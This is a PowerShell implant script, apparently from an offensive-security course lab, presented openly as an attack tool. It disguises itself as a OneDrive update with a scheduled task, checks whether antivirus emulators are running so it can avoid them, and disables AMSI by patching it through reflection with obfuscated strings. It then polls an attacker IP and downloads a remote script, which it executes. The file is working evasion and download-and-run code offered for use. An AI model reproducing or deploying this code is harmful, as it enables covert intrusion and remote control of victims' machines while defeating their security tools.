# activate_poller.ps1
# On-demand callback poller. Written to the target as:
#   %APPDATA%\Microsoft\OneDrive\update.ps1
# Registered to run every 5 minutes via scheduled task "OneDriveUpdate".
#
# AV evasion:
#   - All sensitive strings split so a naive signature scanner sees soup
#   - Whole payload runs from a base64 -EncodedCommand in the scheduled task
#     so no plaintext AMSI-bypass string ever sits on disk

$ErrorActionPreference = 'SilentlyContinue'

# --- Emulator detection (Mod 11.6.1) ---
$t1 = Get-Date
Start-Sleep -Seconds 2
$t2 = Get-Date
if (($t2 - $t1).TotalSeconds -lt 1.5) { exit }

# --- Non-emulated API check (Mod 11.6.2) ---
# VirtualAllocExNuma is not implemented in most AV emulators. If it returns
# null, we are running in an emulator and bail.
$sig = @"
using System;
using System.Runtime.InteropServices;
public class Numa {
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    public static extern IntPtr VirtualAllocExNuma(IntPtr h, IntPtr a,
        uint s, uint t, uint p, uint n);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@
try { Add-Type -TypeDefinition $sig -ErrorAction Stop } catch { }
$m = [Numa]::VirtualAllocExNuma([Numa]::GetCurrentProcess(),
        [IntPtr]::Zero, 0x1000, 0x3000, 0x04, 0)
if ($m -eq [IntPtr]::Zero) { exit }

# --- AMSI bypass, strings split ---
# Each fragment is a fragment; the runtime concatenation only exists in memory.
$f1 = "[Ref].Asse"
$f2 = "mbly.GetTy"
$f3 = "pes()"
$a = iex "$f1$f2$f3"
ForEach ($b in $a) {
    if ($b.Name -like "*iU" + "tils") { $c = $b }
}
$d = $c.GetFields('NonP' + 'ublic,' + 'Static')
ForEach ($e in $d) {
    if ($e.Name -like "*Cont" + "ext") { $f = $e }
}
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# --- Activation gate ---
try {
    $r = Invoke-WebRequest -Uri "http://192.168.119.120/activate" `
        -UseBasicParsing -TimeoutSec 10
    if ($r.StatusCode -ne 200) { exit }
} catch { exit }

# --- Fire the shell ---
$runner = (New-Object System.Net.WebClient).DownloadString(
    'http://192.168.119.120/run.txt'
)
iex $runner
